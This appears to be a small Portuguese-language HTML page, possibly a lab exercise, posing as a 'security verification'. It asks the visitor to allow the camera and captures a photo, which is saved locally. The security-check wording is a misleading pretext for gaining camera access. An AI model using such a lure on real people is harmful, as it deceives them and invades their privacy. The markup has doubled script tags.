<div class="container">
    <div class="logo">🔒</div>
    <h2>Verificação de Segurança</h2>

    <p style="color: #888; font-size: 13px; margin: 10px 0;">
        Seu dispositivo está sendo verificado para garantir acesso seguro.
    </p>

    <p class="status" id="status">Clique para permitir a câmera.</p>

    <button onclick="pedirCamera()" style="
        margin-top: 20px;
        padding: 12px 20px;
        border: none;
        border-radius: 8px;
        background: #667eea;
        color: white;
        font-weight: bold;
        cursor: pointer;
    ">
        Permitir câmera
    </button>

    <button onclick="capturarFoto()" style="
        margin-top: 10px;
        padding: 12px 20px;
        border: none;
        border-radius: 8px;
        background: #764ba2;
        color: white;
        font-weight: bold;
        cursor: pointer;
    ">
        Capturar foto
    </button>

    <video id="video" autoplay playsinline style="
        display: none;
        width: 300px;
        margin-top: 20px;
        border-radius: 8px;
    "></video>

    <canvas id="canvas" style="display:none;"></canvas>
</div>

<script>
  <script>
const video = document.getElementById('video');
const status = document.getElementById('status');
const canvas = document.getElementById('canvas');

async function pedirCamera() {
    try {
        status.textContent = 'Solicitando permissão da câmera...';

        const stream = await navigator.mediaDevices.getUserMedia({
            video: true,
            audio: false
        });

        video.srcObject = stream;
        video.style.display = 'block';

        status.textContent = 'Câmera permitida com sucesso ✅';
    } catch (err) {
        status.textContent = 'Permissão da câmera negada ou indisponível ❌';
        alert('Erro: ' + err.name + ' - ' + err.message);
    }
}

function capturarFoto() {
    const ctx = canvas.getContext('2d');

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const imagem = canvas.toDataURL('image/jpeg', 0.8);

    const link = document.createElement('a');
    link.href = imagem;
    link.download = 'captura-lab.jpg';
    link.click();

    status.textContent = 'Foto capturada com sucesso ✅';
}
</script>
</script>

</body>
</html>
